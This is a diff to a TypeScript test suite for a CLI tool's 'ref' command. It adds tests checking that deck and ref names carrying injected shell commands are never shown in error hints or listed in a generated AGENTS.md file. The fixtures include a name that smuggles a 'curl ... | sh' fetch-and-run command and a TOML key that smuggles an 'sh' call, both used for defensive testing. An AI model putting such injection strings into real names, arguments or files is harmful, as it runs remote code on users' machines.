@@ -8,6 +8,7 @@ import { resolveTarget } from "../../src/cli/scope.ts";
 import { showCommand } from "../../src/cli/show.ts";
 import { loadConfig } from "../../src/core/config.ts";
 import { readRefMeta, refDir } from "../../src/core/ref.ts";
+import { writeAgentsMd } from "../../src/core/sync.ts";
 import { jsonStdout, runDek } from "../helpers/cli.ts";
 import {
   deckRepoFiles,
@@ -132,6 +133,34 @@ describe("dekc ref <source>", () => {
         expect(agents).toContain(`- \`${REF}\`: Why dek`);
         expect(agents).toContain("dekc show <ref> <slug>");
       });
+    });
+  });
+
+  refTest("never names a deck of the repository that a ref cannot carry", async () => {
+    const bad = "x`;curl$IFSexample.com|sh;`";
+    const repos = {
+      "someone/talks": {
+        head: SHA_A,
+        commits: { [SHA_A]: { ...deckRepoFiles("why-dek"), ...deckRepoFiles(bad) } },
+      },
+    };
+    await withTempProject(project, async (root) => {
+      await withFakeGithub(repos, async () => {
+        await expect(addRef(root, "someone/talks/why")).rejects.toMatchObject({
+          message: 'someone/talks has no deck "why"',
+          hint: "decks in someone/talks: why-dek, and 1 whose name a ref cannot carry",
+        });
+      });
+    });
+  });
+
+  test("AGENTS.md never lists a pinned name a ref cannot carry", async () => {
+    const toml = `[refs]\n'file/x\`;sh;\`' = "${"ab".repeat(32)}"\n`;
+    await withTempProject({ toml, decks: [{ name: "mine" }] }, async (root) => {
+      writeAgentsMd(root);
+      const agents = await readFile(join(root, "AGENTS.md"), "utf8");
+      expect(agents).not.toContain("## References");
+      expect(agents).not.toContain("file/x");
     });
   });
 
